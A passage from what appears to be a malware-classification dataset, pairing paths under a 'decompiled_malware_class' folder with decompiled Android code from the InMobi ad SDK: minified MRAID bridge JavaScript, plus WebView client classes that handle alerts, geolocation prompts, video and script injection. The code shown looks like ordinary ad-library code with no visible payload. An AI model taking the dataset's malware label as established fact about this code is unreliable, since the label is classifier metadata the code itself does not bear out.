eval(\""(\""+utilityController.getCurrentPosition()+\"")\"")}catch(f){a.showAlert(\""getCurrentPosition: \""+f)}};a.getDefaultPosition=function(){try{return eval(\""(\""+utilityController.getDefaultPosition()+\"")\"")}catch(f){a.showAlert(\""getDefaultPosition: \""+f)}};a.getState=function(){try{return String(displayController.getState())}catch(f){a.showAlert(\""getState: \""+f)}};a.getOrientation=function(){try{return String(displayController.getOrientation())}catch(f){a.showAlert(\""getOrientation: \""+f)}};a.isViewable=function(){try{return displayController.isViewable()}catch(f){a.showAlert(\""isViewable: \""+f)}};a.log=function(f){try{utilityController.log(f)}catch(d){a.showAlert(\""log: \""+d)}};a.getPlacementType=function(){return displayController.getPlacementType()};a.asyncPing=function(f){try{utilityController.asyncPing(f)}catch(d){a.showAlert(\""asyncPing: \""+d)}};a.close=function(){try{displayController.close()}catch(f){a.showAlert(\""close: \""+f)}};a.makeCall=function(f){try{f.startsWith(\""tel:\"")?utilityController.openExternal(f):utilityController.openExternal(\""tel:\""+f)}catch(d){a.showAlert(\""makeCall: \""+d)}};\""function\""!=typeof String.prototype.startsWith&&(String.prototype.startsWith=function(a){return 0==this.indexOf(a)});a.sendMail=function(f,d,b){try{utilityController.sendMail(f,d,b)}catch(c){a.showAlert(\""sendMail: \""+c)}};a.sendSMS=function(f,d){try{utilityController.sendSMS(f,d)}catch(b){a.showAlert(\""sendSMS: \""+b)}};a.pauseAudio=function(f){try{var d=getPID(f);utilityController.pauseAudio(d)}catch(b){a.showAlert(\""pauseAudio: \""+b)}};a.muteAudio=function(b){try{var d=getPID(b);utilityController.muteAudio(d)}catch(c){a.showAlert(\""muteAudio: \""+c)}};a.unMuteAudio=function(b){try{var d=getPID(b);utilityController.unMuteAudio(d)}catch(c){a.showAlert(\""unMuteAudio: \""+c)}};a.isAudioMuted=function(b){try{var d=getPID(b);return utilityController.isAudioMuted(d)}catch(c){a.showAlert(\""isAudioMuted: \""+c)}};a.setAudioVolume=function(b,d){try{var c=getPID(b);d=parseInt(d);utilityController.setAudioVolume(c,d)}catch(e){a.showAlert(\""setAudioVolume: \""+e)}};a.getAudioVolume=function(b){try{var d=getPID(b);return utilityController.getAudioVolume(d)}catch(c){a.showAlert(\""getAudioVolume: \""+c)}};a.seekAudio=function(b,d){try{var c=getPID(b);d=parseInt(d);utilityController.seekAudio(c,d)}catch(e){a.showAlert(\""seekAudio: \""+e)}};a.playAudio=function(b,d){var c=!0,e=!1,g=\""normal\"",h=\""normal\"",k=!0,q=\""\"",r=getPID(d);null!=b&&(q=b);null!=d&&(\""undefined\""!=typeof d.autoplay&&!1===d.autoplay&&(c=!1),\""undefined\""!=typeof d.loop&&!0===d.loop&&(e=!0),\""undefined\""!=typeof d.startStyle&&null!=d.startStyle&&(g=d.startStyle),\""undefined\""!=typeof d.stopStyle&&null!=d.stopStyle&&(h=d.stopStyle),\""fullscreen\""==g&&(k=!0));try{utilityController.playAudio(q,c,k,e,g,h,r)}catch(s){a.showAlert(\""playAudio: \""+s)}};a.pauseVideo=function(b){try{var d=getPID(b);utilityController.pauseVideo(d)}catch(c){a.showAlert(\""pauseVideo: \""+c)}};a.closeVideo=function(b){try{var d=getPID(b);utilityController.closeVideo(d)}catch(c){a.showAlert(\""closeVideo: \""+c)}};a.hideVideo=function(b){try{var d=getPID(b);utilityController.hideVideo(d)}catch(c){a.showAlert(\""hideVideo: \""+c)}};a.showVideo=function(b){try{var d=getPID(b);utilityController.showVideo(d)}catch(c){a.showAlert(\""showVideo: \""+c)}};a.muteVideo=function(b){try{var d=getPID(b);utilityController.muteVideo(d)}catch(c){a.showAlert(\""muteVideo: \""+c)}};a.unMuteVideo=function(b){try{var d=getPID(b);utilityController.unMuteVideo(d)}catch(c){a.showAlert(\""unMuteVideo: \""+c)}};a.seekVideo=function(b,d){try{var c=getPID(b);d=parseInt(d);utilityController.seekVideo(c,d)}catch(e){a.showAlert(\""seekVideo: \""+e)}};a.isVideoMuted=function(b){try{var d=getPID(b);return utilityController.isVideoMuted(d)}catch(c){a.showAlert(\""isVideoMuted: \""+c)}};a.setVideoVolume=function(b,d){try{var c=getPID(b);d=parseInt(d);utilityController.setVideoVolume(c,d)}catch(e){a.showAlert(\""setVideoVolume: \""+e)}};a.getVideoVolume=function(b){try{var c=getPID(b);return utilityController.getVideoVolume(c)}catch(e){a.showAlert(\""getVideoVolume: \""+e)}};a.playVideo=function(b,c){var e=!1,g=!0,h=!0,k=!1,t=-99999,q=-99999,r=-99999,s=-99999,u=\""normal\"",v=\""exit\"",w=\""\"",x=getPID(c);null!=b&&(w=b);null!=c&&(\""undefined\""!=typeof c.audio&&\""muted\""==c.audio&&(e=!0),\""undefined\""!=typeof c.autoplay&&!1===c.autoplay&&(g=!1),\""undefined\""!=typeof c.controls&&!1===c.controls&&(h=!1),\""undefined\""!=typeof c.loop&&!0===c.loop&&(k=!0),\""undefined\""!=typeof c.inline&&null!=c.inline&&(t=c.inline.left,q=c.inline.top),\""undefined\""!=typeof c.width&&null!=c.width&&(r=c.width),\""undefined\""!=typeof c.height&&null!=c.height&&(s=c.height),\""undefined\""!=typeof c.startStyle&&null!=c.startStyle&&(u=c.startStyle),\""undefined\""!=typeof c.stopStyle&&null!=c.stopStyle&&(v=c.stopStyle),\""fullscreen\""==u&&(h=!0),t=parseInt(t).toString(),q=parseInt(q).toString(),r=parseInt(r).toString(),s=parseInt(s).toString());try{utilityController.playVideo(w,e,g,h,k,t,q,r,s,u,v,x)}catch(y){a.showAlert(\""playVideo: \""+y)}};a.updateToPassbook=function(c){window.mraid.broadcastEvent(\""error\"",\""Method not supported\"",\""updateToPassbook\"");a.log(\""Method not supported\"")};a.stringify=function(c){if(\""undefined\""===typeof JSON){var b=\""\"",e;if(\""undefined\""==typeof c.length)return a.stringifyArg(c);for(e=0;e<c.length;e++)0<e&&(b+=\"",\""),b+=a.stringifyArg(c[e]);return b+\""]\""}return JSON.stringify(c)};a.stringifyArg=function(c){var b,e,g;e=typeof c;b=\""\"";if(\""number\""===e||\""boolean\""===e)b+=args;else if(c instanceof Array)b=b+\""[\""+c+\""]\"";else if(c instanceof Object){e=!0;b+=\""{\"";for(g in c)null!==c[g]&&(e||(b+=\"",\""),b=b+'\""'+g+'\"":',e=typeof c[g],b=\""number\""===e||\""boolean\""===e?b+c[g]:\""function\""===typeof c[g]?b+'\""\""':c[g]instanceof Object?b+this.stringify(args[i][g]):b+'\""'+c[g]+'\""',e=!1);b+=\""}\""}else c=c.replace(/\\\\/g,\""\\\\\\\\\""),c=c.replace(/\""/g,'\\\\\""'),b=b+'\""'+c+'\""';a.showAlert(\""json:\""+b);return b};getPID=function(a){var c=\""\"";null!=a&&(\""undefined\""!=typeof a.id&&null!=a.id)&&(c=a.id);return c};var g,k=!0;a.getWindowOrientation=function(){var a=window.orientation;0>a&&(a+=360);return a};var h=function(){if(k||a.getWindowOrientation()!==g)k=!1,g=a.getWindowOrientation(),displayController.onOrientationChange(),mraid.broadcastEvent(\""orientationChange\"",g)};a.registerOrientationListener=function(){g=a.getWindowOrientation();window.addEventListener(\""resize\"",h,!1);window.addEventListener(\""orientationchange\"",h,!1)};a.unRegisterOrientationListener=function(){window.removeEventListener(\""resize\"",h,!1);window.removeEventListener(\""orientationchange\"",h,!1)};a.registerMicListener=function(){utilityController.registerMicListener()};a.unRegisterMicListener=function(){utilityController.unRegisterMicListener()};a.resize=function(){if(null==a.resizeProps)window.mraid.broadcastEvent(\""error\"",\""Valid resize dimensions must be provided before calling resize\"",\""resize\"");else try{displayController.resize()}catch(c){a.showAlert(\""resize called in bridge\"")}};a.vibrate=function(){utilityController.vibrate()};a.takeCameraPicture=function(){utilityController.takeCameraPicture()};a.getGalleryImage=function(){utilityController.getGalleryImage()};a.createCalendarEvent=function(a){\""object\""!=typeof a&&window.mraid.broadcastEvent(\""error\"",\""createCalendarEvent method expects parameter\"",\""createCalendarEvent\"");\""string\""!=typeof a.start||\""string\""!=typeof a.end?window.mraid.broadcastEvent(\""error\"",\""createCalendarEvent method expects string parameters for start and end dates\"",\""createCalendarEvent\""):(\""string\""!=typeof a.location&&(a.location=\""\""),\""string\""!=typeof a.description&&(a.description=\""\""),utilityController.createCalendarEvent(a.start,a.end,a.location,a.description))};a.supports=function(a){console.log(\""bridge: supports\"");if(\""string\""!=typeof a)window.mraid.broadcastEvent(\""error\"",\""Supports method expects string parameter\"",\""supports\"");else return\""false\""!=utilityController.supportsFeature(a)};a.postToSocial=function(a,c,b,e){a=parseInt(a);isNaN(a)&&window.mraid.broadcastEvent(\""error\"",\""socialType must be an integer\"",\""postToSocial\"");\""string\""!=typeof c&&(c=\""\"");\""string\""!=typeof b&&(b=\""\"");\""string\""!=typeof e&&(e=\""\"");utilityController.postToSocial(a,c,b,e)};a.storePicture=function(c){console.log(\""bridge: storePicture\"");if(\""string\""!=typeof c)window.mraid.broadcastEvent(\""error\"",\""storePicture method expects url as string parameter\"",\""storePicture\"");else{if(a.supports(\""storePicture\""))return!window.confirm(\""Do you want to download the file?\"")?(window.mraid.broadcastEvent(\""error\"",\""Store picture on \""+c+\"" was cancelled by user.\"",\""storePicture\""),!1):utilityController.storePicture(c);window.mraid.broadcastEvent(\""error\"",\""Store picture on \""+c+\"" was cancelled because it is unsupported in this device/app.\"",\""storePicture\"")}};a.getMicIntensity=utilityController.getMicIntensity();window.mraidview.registerOrientationListener()})();(function(){var a=window.mraid=new InmobiObj,b=window.mraidview;a.useCustomClose=b.useCustomClose;a.close=b.close;a.getExpandProperties=b.getExpandProperties;a.setExpandProperties=b.setExpandProperties;a.getResizeProperties=b.getResizeProperties;a.setResizeProperties=b.setResizeProperties;a.getOrientationProperties=b.getOrientationProperties;a.setOrientationProperties=b.setOrientationProperties;a.expand=b.expand;a.getMaxSize=b.getMaxSize;a.getState=b.getState;a.getOrientation=b.getOrientation;a.isViewable=b.isViewable;a.open=function(c){\""string\""!=typeof c?a.broadcastEvent(\""error\"",\""URL is required.\"",\""open\""):b.open(c)};a.resize=b.resize;a.log=function(c){\""undefined\""==typeof c?a.broadcastEvent(\""error\"",\""message is required.\"",\""log\""):\""string\""==typeof c?b.log(c):b.log(JSON.stringify(c))};a.getVersion=function(){return\""2.0\""};a.getInMobiAIVersion=function(){return\""2.0\""};a.getPlacementType=b.getPlacementType;a.asyncPing=function(c){\""string\""!=typeof c?a.broadcastEvent(\""error\"",\""URL is required.\"",\""asyncPing\""):b.asyncPing(c)};a.makeCall=function(c){\""string\""!=typeof c?a.broadcastEvent(\""error\"",\""Request must provide a number to call.\"",\""makeCall\""):b.makeCall(c)};a.sendMail=function(c,e,g){\""string\""!=typeof c?a.broadcastEvent(\""error\"",\""Request must specify a recipient.\"",\""sendMail\""):b.sendMail(c,e,g)};a.sendSMS=function(c,e){\""string\""!=typeof c?a.broadcastEvent(\""error\"",\""Request must specify a recipient.\"",\""sendSMS\""):b.sendSMS(c,e)};a.playAudio=function(a,e){\""object\""!=typeof e?\""string\""==typeof a?b.playAudio(a,null):\""object\""==typeof a?b.playAudio(null,a):b.playAudio(null,null):b.playAudio(a,e)};a.playVideo=function(a,e){\""object\""!=typeof e?\""string\""==typeof a?b.playVideo(a,null):\""object\""==typeof a?b.playVideo(null,a):b.playVideo(null,null):b.playVideo(a,e)};a.pauseAudio=b.pauseAudio;a.muteAudio=b.muteAudio;a.unMuteAudio=b.unMuteAudio;a.isAudioMuted=b.isAudioMuted;a.setAudioVolume=function(c){if(\""object\""!=typeof c&&null!=c)a.broadcastEvent(\""error\"",\""Request must specify a valid properties\"",\""setAudioVolume\"");else{var e=c.volume;isNaN(e)?a.broadcastEvent(\""error\"",\""Request must specify a valid volume in the range [0,100]\"",\""setAudioVolume\""):(0>e?e=0:100<e&&(e=100),b.setAudioVolume(c,e))}};a.getAudioVolume=b.getAudioVolume;a.pauseVideo=b.pauseVideo;a.closeVideo=b.closeVideo;a.hideVideo=b.hideVideo;a.showVideo=b.showVideo;a.muteVideo=b.muteVideo;a.unMuteVideo=b.unMuteVideo;a.isVideoMuted=b.isVideoMuted;a.setVideoVolume=function(c){if(\""object\""!=typeof c&&null!=c)a.broadcastEvent(\""error\"",\""Request must specify a valid properties\"",\""setAudioVolume\"");else{var e=c.volume;isNaN(e)?a.broadcastEvent(\""error\"",\""Request must specify a valid volume in the range [0,100]\"",\""setVideoVolume\""):(0>e?e=0:100<e&&(e=100),b.setVideoVolume(c,e))}};a.getVideoVolume=b.getVideoVolume;a.seekAudio=function(c){if(\""object\""!=typeof c&&null!=c)a.broadcastEvent(\""error\"",\""Request must specify a valid properties\"",\""seekAudio\"");else{var e=c.time;imIsObjInvalid(e)?a.broadcastEvent(\""error\"",\""Request must specify a valid time\"",\""seekAudio\""):0!=e?a.broadcastEvent(\""error\"",\""Cannot seek audio other than 0\"",\""seekAudio\""):b.seekAudio(c,e)}};a.seekVideo=function(c){if(\""object\""!=typeof c&&null!=c)a.broadcastEvent(\""error\"",\""Request must specify a valid time\"",\""seekVideo\"");else{var e=c.time;imIsObjInvalid(e)?a.broadcastEvent(\""error\"",\""Request must specify a valid time\"",\""seekVideo\""):0!=e?a.broadcastEvent(\""error\"",\""Cannot seek video other than 0\"",\""seekVideo\""):b.seekVideo(c,e)}};a.openExternal=b.openExternal;a.getScreenSize=b.getScreenSize;a.getCurrentPosition=b.getCurrentPosition;a.getDefaultPosition=b.getDefaultPosition;a.updateToPassbook=function(c){\""string\""!=typeof c?a.broadcastEvent(\""error\"",\""Request must specify a valid URL\"",\""updateToPassbook\""):b.updateToPassbook(c)};a.acceptAction=b.acceptAction;a.rejectAction=b.rejectAction;a.storePicture=function(c){\""string\""!=typeof c?a.broadcastEvent(\""error\"",\""Request must specify a valid URL\"",\""storePicture\""):b.storePicture(c)};a.vibrate=b.vibrate;a.takeCameraPicture=b.takeCameraPicture;a.getMicIntensity=function(){return imIsObjInvalid(a.listeners.micIntensityChange)?-1:b.getMicIntensity()};a.postToSocial=b.postToSocial;a.supports=function(a){var e=!1;\""inlineVideo\""==a?(e=b.supports(a),!1==e&&(e=b.supports(\""html5video\""))):e=b.supports(a);return e};a.getPlatform=b.getPlatform})();(function(){var a=window._im_imaiBridge={ios:{}};a.broadcastEvent=function(){for(var a=Array(arguments.length),c=0;c<arguments.length;c++)a[c]=arguments[c];c=a.shift();try{window.mraid.broadcastEvent(c,a)}catch(e){}};a.getPlatform=function(){return\""android\""};a.getPlatformVersion=function(){return imaiController.getPlatformVersion()};a.log=function(a){imaiController.log(a)};a.openEmbedded=function(a){imaiController.openEmbedded(a)};a.openExternal=function(a){imaiController.openExternal(a)};a.ping=function(a,c){imaiController.ping(a,c)};a.pingInWebView=function(a,c){imaiController.pingInWebView(a,c)};a.getSdkVersion=function(){try{var a=imaiController.getSdkVersion();if(\""string\""==typeof a&&null!=a)return a}catch(c){return\""3.7.0\""}};a.onUserInteraction=function(a){if(\""object\""!=typeof a||null==a)utilityController.onUserInteraction(\""{}\"");else try{utilityController.onUserInteraction(JSON.stringify(a))}catch(c){utilityController.onUserInteraction(\""{}\"")}};a.ios.openItunesProductView=function(a){this.broadcastEvent(\""error\"",\""functionality not supported\"",\""openItunesProductView\"")};a.ios.updateToPassbook=function(a){this.broadcastEvent(\""error\"",\""functionality not supported\"",\""updateToPassbook\"")}})();(function(){var a=window._im_imaiBridge;window._im_imai=new InmobiObj;window._im_imai.ios=new InmobiObj;var b=window._im_imai;b.matchString=function(a,b){if(\""string\""!=typeof a||null==a||null==b)return-1;var g=-1;try{g=a.indexOf(b)}catch(k){}return g};b.isHttpUrl=function(a){return\""string\""!=typeof a||null==a?!1:0==b.matchString(a,\""http://\"")?!0:0==b.matchString(a,\""https://\"")?!0:!1};b.appendTapParams=function(a,e,g){if(imIsObjInvalid(e)||imIsObjInvalid(g))return a;b.isHttpUrl(a)&&(a=-1==b.matchString(a,\""?\"")?a+(\""?u-tap-o=\""+e+\"",\""+g):a+(\""&u-tap-o=\""+e+\"",\""+g));return a};b.performAdClick=function(a,e){e=e||event;if(imIsObjInvalid(a))b.log(\"" invalid config, nothing to process .\""),this.broadcastEvent(\""error\"",\""invalid config, nothing to process .\"");else{var g=a.clickConfig,k=a.landingConfig;if(imIsObjInvalid(g)&&imIsObjInvalid(k))b.log(\""click/landing config are invalid, Nothing to process .\""),this.broadcastEvent(\""error\"",\""click/landing config are invalid, Nothing to process .\"");else{var h=null,f=null,d=null,m=null,n=null,l=null,p=null;if(imIsObjValid(e))try{m=e.changedTouches[0].pageX,n=e.changedTouches[0].pageY}catch(t){n=m=0}imIsObjInvalid(k)?(l=g.url,p=g.urlType):imIsObjInvalid(g)?(l=k.url,p=k.urlType):(l=k.url,p=k.urlType,h=g.url,f=g.pingWV,d=g.fr);g=b.getPlatform();try{if(\""boolean\""!=typeof d&&\""number\""!=typeof d||null==d)d=!0;if(0>d||1<d)d=!0;if(\""boolean\""!=typeof f&&\""number\""!=typeof f||null==f)f=!0;if(0>f||1<f)f=!0;if(\""number\""!=typeof p||null==p)p=0;h=b.appendTapParams(h,m,n);imIsObjValid(h)?!0==f?b.pingInWebView(h):b.ping(h,d):b.log(\""clickurl provided is null.\"");if(imIsObjValid(l))switch(imIsObjInvalid(h)&&(l=b.appendTapParams(l,m,n)),p){case 1:b.openEmbedded(l);break;case 2:\""ios\""==g?b.ios.openItunesProductView(l):this.broadcastEvent(\""error\"",\""Cannot process openItunesProductView for os\""+g);break;default:b.openExternal(l)}else b.log(\""Landing url provided is null.\"")}catch(q){}}}};b.performActionClick=function(a,e){e=e||event;if(imIsObjInvalid(a))b.log(\"" invalid config, nothing to process .\""),this.broadcastEvent(\""error\"",\""invalid config, nothing to process .\"");else{var g=a.clickConfig,k=a.landingConfig;if(imIsObjInvalid(g)&&imIsObjInvalid(k))b.log(\""click/landing config are invalid, Nothing to process .\""),this.broadcastEvent(\""error\"",\""click/landing config are invalid, Nothing to process .\"");else{var h=null,f=null,d=null,m=null,n=null;if(imIsObjValid(e))try{m=e.changedTouches[0].pageX,n=e.changedTouches[0].pageY}catch(l){n=m=0}imIsObjValid(g)&&(h=g.url,f=g.pingWV,d=g.fr);try{if(\""boolean\""!=typeof d&&\""number\""!=typeof d||null==d)d=!0;if(0>d||1<d)d=!0;if(\""boolean\""!=typeof f&&\""number\""!=typeof f||null==f)f=!0;if(0>f||1<f)f=!0;h=b.appendTapParams(h,m,n);imIsObjValid(h)?!0==f?b.pingInWebView(h):b.ping(h,d):b.log(\""clickurl provided is null.\"");b.onUserInteraction(k)}catch(p){}}}};b.getVersion=function(){return\""1.0\""};b.getPlatform=a.getPlatform;b.getPlatformVersion=a.getPlatformVersion;b.log=a.log;b.openEmbedded=a.openEmbedded;b.openExternal=a.openExternal;b.ping=a.ping;b.pingInWebView=a.pingInWebView;b.onUserInteraction=function(b){try{if(imIsObjValid(b)&&\""object\""==typeof b)a.onUserInteraction(b);else a.onUserInteraction({})}catch(e){}};b.getSdkVersion=a.getSdkVersion;b.ios.openItunesProductView=a.ios.openItunesProductView})();"" : rawData;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\a.code","public class a extends WebChromeClient {   final IMWebView a;   public a(  IMWebView iMWebView){     this.a=iMWebView;   }   @Override public boolean onJsAlert(  WebView webView,  String str,  String str2,  JsResult jsResult){     Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> onJsAlert, "" + str2);     try {       new AlertDialog.Builder(webView.getContext()).setTitle(str).setMessage(str2).setPositiveButton(R.string.ok,new c(jsResult)).setCancelable(false).create().show();       return true;     }  catch (    Exception e2) {       Log.internal(Constants.RENDERING_LOG_TAG,""webchrome client exception onJSAlert "",e2);       return true;     }   } class c implements DialogInterface.OnClickListener {     final JsResult a;     c(    JsResult jsResult){       this.a=jsResult;     }     @Override public void onClick(    DialogInterface dialogInterface,    int i){       this.a.confirm();     }   }   @Override public void onShowCustomView(  View view,  WebChromeClient.CustomViewCallback customViewCallback){     View view2;     View view3;     FrameLayout frameLayout;     View view4;     FrameLayout frameLayout2;     FrameLayout frameLayout3;     VideoView videoView;     MediaPlayer.OnCompletionListener onCompletionListener;     VideoView videoView2;     View view5;     View view6;     this.a.k=view;     this.a.l=customViewCallback;     Log.debug(Constants.RENDERING_LOG_TAG,""onShowCustomView ******************************"" + view);     try {       IMWebView iMWebView=this.a;       view2=this.a.k;       iMWebView.a(view2,new b());       view3=this.a.k;       view3.setOnTouchListener(new e());       if (view instanceof FrameLayout) {         this.a.n=(FrameLayout)view;         FrameLayout frameLayout4=(FrameLayout)this.a.t.findViewById(R.id.content);         frameLayout=this.a.n;         if (!(frameLayout.getFocusedChild() instanceof VideoView)) {           this.a.k=view;           view.setBackgroundColor(-16777216);           Log.debug(Constants.RENDERING_LOG_TAG,""adding "" + view);           frameLayout4.addView(view,new AbsoluteLayout.LayoutParams(-1,-1,0,0));           IMWebView iMWebView2=this.a;           view4=this.a.k;           iMWebView2.a(view4,new ViewOnKeyListenerC0024a());         }  else {           IMWebView iMWebView3=this.a;           frameLayout2=this.a.n;           iMWebView3.j=(VideoView)frameLayout2.getFocusedChild();           frameLayout3=this.a.n;           frameLayout3.setBackgroundColor(-16777216);           videoView=this.a.j;           onCompletionListener=this.a.F;           videoView.setOnCompletionListener(onCompletionListener);           videoView2=this.a.j;           videoView2.setOnFocusChangeListener(new d());           view5=this.a.k;           frameLayout4.addView(view5,new AbsoluteLayout.LayoutParams(-1,-1,0,0));           Log.debug(Constants.RENDERING_LOG_TAG,""Registering"");           IMWebView iMWebView4=this.a;           view6=this.a.k;           iMWebView4.a(view6,new h());         }       }     }  catch (    Exception e2) {       Log.internal(Constants.RENDERING_LOG_TAG,""IMWebview onShowCustomView exception "",e2);     }   } class b implements View.OnTouchListener {     b(){     }     @Override public boolean onTouch(    View view,    MotionEvent motionEvent){       return false;     }   } class e implements View.OnTouchListener {     e(){     }     @Override public boolean onTouch(    View view,    MotionEvent motionEvent){       return true;     }   } class d implements View.OnFocusChangeListener {     d(){     }     @Override public void onFocusChange(    View view,    boolean z){       VideoView videoView;       videoView=a.this.a.j;       videoView.requestFocus();     }   } class h implements View.OnKeyListener {     h(){     }     @Override public boolean onKey(    View view,    int i,    KeyEvent keyEvent){       VideoView videoView;       if (4 == keyEvent.getKeyCode() && keyEvent.getAction() == 0) {         Log.debug(Constants.RENDERING_LOG_TAG,""Back Button pressed when html5 video is playing"");         videoView=a.this.a.j;         videoView.stopPlayback();         a.this.a.d();       }       return false;     }   } class ViewOnKeyListenerC0024a implements View.OnKeyListener {     ViewOnKeyListenerC0024a(){     }     @Override public boolean onKey(    View view,    int i,    KeyEvent keyEvent){       Log.debug(Constants.RENDERING_LOG_TAG,""Back Button pressed when html5 video is playing"");       a.this.a.d();       return false;     }   }   @Override public void onGeolocationPermissionsShowPrompt(  String str,  GeolocationPermissions.Callback callback){     try {       AlertDialog.Builder builder=new AlertDialog.Builder(this.a.t);       builder.setTitle(""Locations access"");       builder.setMessage(""Allow location access"").setCancelable(true).setPositiveButton(""Accept"",new g(callback,str)).setNegativeButton(""Decline"",new f(callback,str));       builder.create().show();       super.onGeolocationPermissionsShowPrompt(str,callback);     }  catch (    Exception e2) {       Log.internal(Constants.RENDERING_LOG_TAG,""Exception while accessing location from creative "",e2);       callback.invoke(str,false,false);     }   } class g implements DialogInterface.OnClickListener {     final GeolocationPermissions.Callback a;     final String b;     g(    GeolocationPermissions.Callback callback,    String str){       this.a=callback;       this.b=str;     }     @Override public void onClick(    DialogInterface dialogInterface,    int i){       this.a.invoke(this.b,true,false);     }   } class f implements DialogInterface.OnClickListener {     final GeolocationPermissions.Callback a;     final String b;     f(    GeolocationPermissions.Callback callback,    String str){       this.a=callback;       this.b=str;     }     @Override public void onClick(    DialogInterface dialogInterface,    int i){       this.a.invoke(this.b,false,false);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\b.code","class b implements View.OnTouchListener {   b(){   }   @Override public boolean onTouch(  View view,  MotionEvent motionEvent){     return false;   } } public class b extends WebViewClient {   final IMWebView a;   public b(  IMWebView iMWebView){     this.a=iMWebView;   }   @Override public void onPageStarted(  WebView webView,  String str,  Bitmap bitmap){     WebViewClient webViewClient;     WebViewClient webViewClient2;     this.a.setState(IMWebView.ViewState.LOADING);     Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> onPageStarted url: "" + str + "" p ""+ this.a.getParent());     if (this.a.getParent() == null) {       this.a.A=true;     }     webViewClient=this.a.u;     if (webViewClient != null) {       webViewClient2=this.a.u;       webViewClient2.onPageStarted(webView,str,bitmap);     }     this.a.mraidLoaded=false;   }   @Override public void onReceivedError(  WebView webView,  int i,  String str,  String str2){     WebViewClient webViewClient;     AtomicBoolean atomicBoolean;     WebViewClient webViewClient2;     Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> error: "" + str);     webViewClient=this.a.u;     if (webViewClient != null) {       webViewClient2=this.a.u;       webViewClient2.onReceivedError(webView,i,str,str2);     }     try {       if (this.a.i == IMWebView.ViewState.LOADING && this.a.mListener != null) {         atomicBoolean=this.a.x;         if (!atomicBoolean.get()) {           this.a.mListener.onError();         }       }       this.a.r=null;     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in webview loading "",e);     }   }   @Override public void onPageFinished(  WebView webView,  String str){     WebViewClient webViewClient;     ArrayList arrayList;     Message message;     Message message2;     Message message3;     AtomicBoolean atomicBoolean;     Message message4;     WebViewClient webViewClient2;     Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> onPageFinished, url: "" + str);     webViewClient=this.a.u;     if (webViewClient != null) {       webViewClient2=this.a.u;       webViewClient2.onPageFinished(webView,str);     }     try {       arrayList=this.a.w;       if (arrayList.contains(str) && !this.a.mraidLoaded) {         this.a.injectJavaScript(Initializer.getMRAIDString());       }       Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> Current State:"" + this.a.i);       if (this.a.i == IMWebView.ViewState.LOADING) {         this.a.injectJavaScript(""window.mraid.broadcastEvent('ready');"");         Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> Firing ready event at "" + webView);         if (this.a.mOriginalWebviewForExpandUrl != null) {           this.a.setState(IMWebView.ViewState.EXPANDED);         }  else {           this.a.setState(IMWebView.ViewState.DEFAULT);         }         if ((!this.a.mIsInterstitialAd || this.a.mWebViewIsBrowserActivity) && this.a.getVisibility() == 4) {           this.a.setVisibility(0);         }         message=this.a.r;         if (message != null) {           atomicBoolean=this.a.x;           if (!atomicBoolean.get()) {             message4=this.a.r;             message4.sendToTarget();           }         }         message2=this.a.s;         if (message2 != null) {           message3=this.a.s;           message3.sendToTarget();         }       }     }  catch (    Exception e) {       Log.debug(Constants.RENDERING_LOG_TAG,""Exception in onPageFinished "",e);     }   }   @Override public boolean shouldOverrideUrlLoading(  WebView webView,  String str){     boolean z=true;     Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> shouldOverrideUrlLoading, url:"" + str + ""webview id""+ webView);     try {       if (!this.a.mWebViewIsBrowserActivity) {         this.a.a(str);       }  else       if (!str.startsWith(""http:"") && !str.startsWith(""https:"")) {         this.a.a(str);       }  else {         this.a.doHidePlayers();         z=false;       }       return z;     }  catch (    Exception e) {       Log.internal(Constants.RENDERING_LOG_TAG,""Should override exception"",e);       return false;     }   }   @Override public void onReceivedSslError(  WebView webView,  SslErrorHandler sslErrorHandler,  SslError sslError){     this.a.a(sslErrorHandler,sslError);   }   @Override public void onLoadResource(  WebView webView,  String str){     WebViewClient webViewClient;     ArrayList arrayList;     ArrayList arrayList2;     WebViewClient webViewClient2;     Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> onLoadResource:"" + str);     try {       webViewClient=this.a.u;       if (webViewClient != null) {         webViewClient2=this.a.u;         webViewClient2.onLoadResource(webView,str);       }       if (str != null && str.contains(""/mraid.js"") && !this.a.getUrl().equals(""about:blank"") && !this.a.getUrl().startsWith(""file:"")) {         Log.debug(Constants.RENDERING_LOG_TAG,""IMWebView-> onLoadResource:Hippy, Mraid ad alert!...injecting mraid and mraidview object at "" + webView.getUrl());         String url=this.a.getUrl();         arrayList=this.a.w;         if (!arrayList.contains(url)) {           arrayList2=this.a.w;           arrayList2.add(url);         }         if (!this.a.mraidLoaded) {           this.a.injectJavaScript(Initializer.getMRAIDString());         }         this.a.mraidLoaded=true;       }     }  catch (    Exception e) {       Log.internal(Constants.RENDERING_LOG_TAG,""Cannot load resource"",e);     }   } } public class b implements DialogInterface.OnClickListener {   final SslError a;   b(  SslError sslError){     this.a=sslError;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     dialogInterface.cancel();     IMWebView.this.a(WrapperFunctions.getSSLErrorUrl(this.a));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.inmobi.re.container\c.code","class c implements DialogInterface.OnClickListener {   final JsResult a;   c(  JsResult jsResult){     this.a=jsResult;   }   @Override public void onClick(  DialogInterface dialogInterface,  int i){     this.a.confirm();   } } public class c implements MediaPlayer.OnCompletionListener {   final IMWebView a;   public c(  IMWebView iMWebView){     this.a=iMWebView;   }   @Override public void onCompletion(  MediaPlayer mediaPlayer){     FrameLayout frameLayout;     ViewGroup viewGroup;     try {       mediaPlayer.stop();       frameLayout=this.a.n;       frameLayout.setVisibility(8);       this.a.d();       Activity activity=this.a.t;       viewGroup=this.a.m;       activity.setContentView(viewGroup);     }  catch (    Exception e) {       Log.internal(Constants.RENDERING_LOG_TAG,""Media Player onCompletion"",e);     }   } } class c implements Runnable {   c(){   }   